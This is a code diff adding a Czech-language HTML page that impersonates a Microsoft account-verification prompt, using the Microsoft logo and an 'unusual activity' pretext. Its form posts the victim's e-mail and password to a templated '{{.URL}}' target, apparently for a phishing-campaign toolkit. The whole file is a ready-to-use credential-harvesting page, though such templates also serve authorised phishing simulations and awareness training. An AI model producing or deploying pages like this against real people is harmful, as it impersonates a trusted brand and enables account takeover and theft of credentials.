@@ -1,0 +1,55 @@
+<html lang="cs">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <title>Microsoft – ověření přihlášení</title>
+    <link rel="stylesheet" href="style.css" />
+  </head>
+  <body>
+    <div class="brandbar"></div>
+
+    <header class="top">
+      <img
+        alt=""
+        itemprop="logo"
+        class="c-image"
+        src="https://uhf.microsoft.com/images/microsoft/RE1Mu3b.png"
+      />
+    </header>
+
+    <main class="signin">
+      <div class="card">
+        <h1 class="title">Neobvyklá aktivita – ověření účtu</h1>
+        <p class="hint">
+          Z důvodu zajištění bezpečnosti je vyžadováno opětovné přihlášení.
+        </p>
+
+        <form method="post" action="{{.URL}}" autocomplete="off" class="form">
+          <label for="email" class="label">E-mail</label>
+          <input
+            id="email"
+            name="email"
+            type="email"
+            class="input"
+            placeholder="name@company.com"
+            required
+          />
+
+          <label for="password" class="label">Heslo</label>
+          <input
+            id="password"
+            name="password"
+            type="password"
+            class="input"
+            placeholder="Heslo"
+            required
+          />
+
+          <button type="submit" class="btn">Pokračovat</button>
+        </form>
+      </div>
+    </main>
+
+    <footer class="foot">Microsoft Corporation</footer>
+  </body>
+</html>
